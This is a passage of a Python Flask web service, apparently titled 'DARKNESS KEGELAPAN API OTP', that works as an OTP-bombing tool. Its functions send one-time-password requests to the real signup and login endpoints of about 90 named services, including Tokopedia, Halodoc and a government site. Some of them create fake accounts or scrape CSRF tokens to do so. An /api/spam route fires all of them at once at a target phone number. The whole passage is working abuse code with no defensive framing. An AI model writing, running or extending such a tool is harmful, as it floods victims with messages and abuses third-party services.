        email = f"user_{suffix}@gmail.com"; uname = f"user_{suffix[:6]}"
        password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=13))
        s = requests.Session()
        s.get("https://www.rahasyavedicastrology.com/login/", headers={"user-agent":ua()}, timeout=15)
        hb = {"accept":"*/*","content-type":"application/json","origin":"https://www.rahasyavedicastrology.com","referer":"https://www.rahasyavedicastrology.com/login/","user-agent":ua()}
        s.post("https://www.rahasyavedicastrology.com/api/v2/auth/sign-up/email", json={"email":email.lower(),"password":password,"name":uname,"username":uname.lower()}, headers=hb, timeout=15)
        s.post("https://www.rahasyavedicastrology.com/api/auth/whatsapp-consent", json={"phone":nomor}, headers=hb, timeout=15)
        r = s.post("https://www.rahasyavedicastrology.com/api/v2/auth/phone-number/send-otp", json={"phoneNumber":nomor}, headers=hb, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_rxone(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = '+' + ('62' + raw[1:] if raw.startswith('0') else raw)
        s = requests.Session()
        s.get("https://rxone.app/", headers={"user-agent":ua()}, timeout=15)
        r = s.post("https://prod-us.rxone.app/api/flask//v2/generate/patient/otp/live",
                   json={"phone":nomor,"wa_otp":True},
                   headers={"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Origin":"https://rxone.app","Referer":"https://rxone.app/","User-Agent":ua()}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_jec(phone):
    try:
        import urllib.parse
        raw = re.sub(r'\D', '', phone)
        nomor = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        s = requests.Session()
        r0 = s.get("https://jec.co.id/id", headers={"user-agent":ua()}, timeout=15)
        m_tok = re.search(r'name="_token"\s+value="([^"]+)"', r0.text)
        m_rdr = re.search(r'name="rdr"\s+value="([^"]+)"', r0.text)
        if not m_tok:
            return False
        rdr = m_rdr.group(1) if m_rdr else ''
        data = urllib.parse.urlencode({'_token':m_tok.group(1),'loginparam':'','rdr':rdr,'mobile':nomor,'remember_me':'1','tos':'1','otp[]':['','','','']}, doseq=True)
        r = s.post("https://jec.co.id/id/login-via-otp", data=data,
                   headers={"Accept":"application/json, text/javascript, */*; q=0.01","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Origin":"https://jec.co.id","Referer":"https://jec.co.id/id","User-Agent":ua(),"X-Requested-With":"XMLHttpRequest"}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

# ============================================================
# OTP REGISTRY
# ============================================================
OTP_REGISTRY = [
    {"name": "Astra Daihatsu", "func": spam_astra_daihatsu},
    {"name": "Carro Co", "func": spam_carro_co},
    {"name": "Carro SSO", "func": spam_carro_sso},
    {"name": "Swiggy", "func": spam_swiggy},
    {"name": "Body Shop WA", "func": spam_thebodyshop_wa},
    {"name": "Body Shop SMS", "func": spam_thebodyshop_sms},
    {"name": "Tokopedia", "func": spam_tokopedia},
    {"name": "Top Indoku", "func": spam_topindoku},
    {"name": "Flip SMS", "func": spam_flip_sms},
    {"name": "Flip WA", "func": spam_flip_wa},
    {"name": "Skul ID SMS", "func": spam_skulid_sms},
    {"name": "Starlite", "func": spam_starlite},
    {"name": "Eraspace", "func": spam_eraspace},
    {"name": "Pinhome", "func": spam_pinhomefix},
    {"name": "Mister Aladin", "func": spam_misteraladinfix},
    {"name": "Yogyagroup", "func": spam_yogyagroup_smsonly},
    {"name": "TipTip", "func": spam_tiptip},
    {"name": "Duniagames", "func": spam_duniagames},
    {"name": "Rumah123", "func": spam_rumah123},
    {"name": "Mitsubishi SMS", "func": spam_mitsubishi_sms},
    {"name": "Mitsubishi WA", "func": spam_mitsubishi_wa},
    {"name": "Internet Rakyat", "func": spam_ira},
    {"name": "Sahabat Daihatsu", "func": spam_sahabat_daihatsu},
    {"name": "Uangme SMS", "func": spam_uangme_sms},
    {"name": "Uangme WA", "func": spam_uangme_wa},
    {"name": "Greensm", "func": spam_greensm},
    {"name": "Bonus Belanja", "func": spam_bonusbelanja},
    {"name": "99.co", "func": spam_99co},
    {"name": "Planet Ban", "func": spam_planetban},
    {"name": "Singa ID", "func": spam_otp_singa},
    {"name": "Uangme.Com V2", "func": spam_otp_uangme_com_v2},
    {"name": "Adiraku", "func": spam_otp_adiraku},
    {"name": "Tokopedia V2", "func": spam_otp_tokopedia_v2},
    {"name": "Duniagames V2", "func": spam_otp_duniagames_v2},
    {"name": "Planet Ban V2", "func": spam_otp_planetban_v2},
    {"name": "Rumah123 V2", "func": spam_otp_rumah123_v2},
    {"name": "Paper.id", "func": spam_otp_paperid},
    {"name": "Jogjakita OTP V2", "func": spam_otp_jogjakita_v2},
    {"name": "Blibli Tiket", "func": spam_otp_bliblitiket},
    {"name": "Yogya Online V2", "func": spam_otp_yogyaonline_v2},
    {"name": "Saturdays", "func": spam_otp_saturdays},
    {"name": "Kredit Pintar", "func": spam_otp_kreditpintar},
    {"name": "Bunda.co.id", "func": spam_otp_bunda},
    {"name": "Daihatsu V2", "func": spam_otp_daihatsu_v2},
    {"name": "Mau Lagi", "func": spam_otp_maulagi},
    {"name": "By.U", "func": spam_otp_byu},
    {"name": "Astra Daihatsu2 V2", "func": spam_otp_astradaihatsu2_v2},
    {"name": "Astra Daihatsu SMS", "func": spam_otp_astradaihatsu_sms},
    {"name": "Vedantu", "func": spam_otp_vedantu},
    {"name": "Bonus Belanja V2", "func": spam_otp_bonusbelanja_v2},
    {"name": "Swiggy V2", "func": spam_otp_swiggy_v2},
    {"name": "Internet Rakyat V2", "func": spam_otp_internetrakyat_v2},
    {"name": "Cairin", "func": spam_otp_cairin},
    {"name": "Halodoc", "func": spam_otp_halodoc},
    {"name": "Greensm V2", "func": spam_otp_greensm_v2},
    {"name": "Matahari", "func": spam_otp_matahari},
    {"name": "iSeller Shop", "func": spam_otp_isellershop},
    {"name": "Mister Aladin V2", "func": spam_otp_misteraladin_v2},
    {"name": "TipTip V2", "func": spam_otp_tiptip_v2},
    {"name": "Dokterin", "func": spam_otp_dokterin},
    {"name": "Seva", "func": spam_otp_seva},
    {"name": "Fastwork", "func": spam_otp_fastwork},
    {"name": "Blibli", "func": spam_otp_blibli},
    {"name": "Mazen Academy", "func": spam_otp_mazenacademy},
    {"name": "Makanklik OTP V2", "func": spam_otp_makanklik_v2},
    {"name": "Baba Market", "func": spam_otp_babamarket},
    {"name": "Nuta Cloud", "func": spam_otp_nutacloud},
    {"name": "Amaha Health", "func": spam_otp_amaha},
    {"name": "MyValue", "func": spam_otp_myvalue},
    {"name": "Eiger", "func": spam_otp_eiger},
    {"name": "Toyota V2", "func": spam_otp_toyota_v2},
    {"name": "NDC Deals", "func": spam_otp_ndcdeals},
    {"name": "ERP360", "func": spam_otp_erp360},
    {"name": "Kemenag", "func": spam_otp_kemenag},
    {"name": "Entrust FO", "func": spam_otp_entrust},
    {"name": "Berprestasi", "func": spam_otp_berprestasi},
    {"name": "Miniso", "func": spam_otp_miniso},
    {"name": "Halo Bengkel", "func": spam_otp_halobengkel},
    {"name": "Software Linkers", "func": spam_otp_softwarelinkers},
    {"name": "Youtap", "func": spam_otp_youtap},
    {"name": "Generasi Maju", "func": spam_otp_generasimaju},
    {"name": "Bunda Semarang", "func": spam_otp_bundasemarang},
    {"name": "Krista Online", "func": spam_otp_kristaonline},
    {"name": "Buccheri", "func": spam_otp_buccheri},
    {"name": "Gabino", "func": spam_otp_gabino},
    {"name": "Morais City", "func": spam_otp_morais},
    {"name": "Rahasya Vedic", "func": spam_otp_rahasya},
    {"name": "RxOne", "func": spam_otp_rxone},
    {"name": "JEC", "func": spam_otp_jec},
]


# ═══════════════════════════════════════════════════════════════
#                       ROUTES
# ═══════════════════════════════════════════════════════════════

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": True,
        "message": "DARKNESS KEGELAPAN API OTP",
        "author": "Arzz",
        "version": "1.0.0",
        "total_apis": len(OTP_REGISTRY),
        "endpoints": {
            "/": "POST { phone: '08xxx' } → kirim OTP ke semua API paralel",
            "/": "POST { phone: '08xxx', name: 'Tokopedia' } → kirim OTP ke 1 API spesifik",
            "/api/list": "GET → daftar semua API tersedia"
        }
    })

@app.route("/api/list", methods=["GET"])
def list_apis():
    return jsonify({
        "status": True,
        "total": len(OTP_REGISTRY),
        "apis": [a["name"] for a in OTP_REGISTRY]
    })

@app.route("/api/spam", methods=["POST", "GET"])
def spam_all():
    try:
        data = request.get_json(silent=True) or request.form or request.args
        phone = data.get("phone", "").strip()
        if not phone or not re.sub(r'\D', '', phone):
            return jsonify({"status": False, "message": "Phone required"}), 400

        start = time.time()
        results = []
        lock = threading.Lock()
        success = [0]
        failed = [0]

        def worker(api):
            try:
                ok = api["func"](phone)
            except Exception:
                ok = False
            with lock:
                if ok:
                    success[0] += 1
                else:
                    failed[0] += 1
                results.append({"name": api["name"], "status": ok})

        with ThreadPoolExecutor(max_workers=len(OTP_REGISTRY)) as ex:
            futures = [ex.submit(worker, a) for a in OTP_REGISTRY]
            for f in as_completed(futures):
                try: f.result(timeout=30)
                except Exception: pass

        elapsed = round(time.time() - start, 2)

        return jsonify({
            "status": True,
            "phone": phone,
            "total": len(OTP_REGISTRY),
            "success": success[0],
            "failed": failed[0],
            "elapsed": elapsed,
            "results": results
        })
    except Exception as e:
        return jsonify({"status": False, "message": str(e)}), 500

@app.route("/api/one", methods=["POST", "GET"])
def spam_one():
    try:
        data = request.get_json(silent=True) or request.form or request.args
        phone = data.get("phone", "").strip()
        name = data.get("name", "").strip()
        if not phone or not name:
            return jsonify({"status": False, "message": "phone & name required"}), 400

        target = None
        for a in OTP_REGISTRY:
            if a["name"].lower() == name.lower():
                target = a
                break
        if not target:
            return jsonify({"status": False, "message": f"API '{name}' not found"}), 404

        start = time.time()
        try:
            ok = target["func"](phone)
        except Exception:
            ok = False
        elapsed = round(time.time() - start, 2)

        return jsonify({
            "status": True,
            "phone": phone,
            "name": target["name"],
            "success": ok,
            "elapsed": elapsed
        })
    except Exception as e:
        return jsonify({"status": False, "message": str(e)}), 500

# Vercel handler
handler = app